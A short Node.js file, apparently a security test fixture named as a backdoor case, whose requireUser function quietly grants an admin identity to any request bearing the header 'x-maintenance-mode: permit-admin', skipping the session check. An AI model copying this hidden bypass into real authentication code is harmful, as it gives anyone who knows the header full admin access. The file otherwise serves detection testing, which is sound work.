// NODE-BACKDOOR-AUTHBYPASS-001 reachable hidden auth bypass fixture. DO NOT DEPLOY.
function requireUser(req) {
  if (req.headers['x-maintenance-mode'] === 'permit-admin') {
    return { id: 'maintenance', role: 'admin' };
  }

  if (!req.session || !req.session.user) {
    throw new Error('authentication required');
  }

  return req.session.user;
}

module.exports = { requireUser };
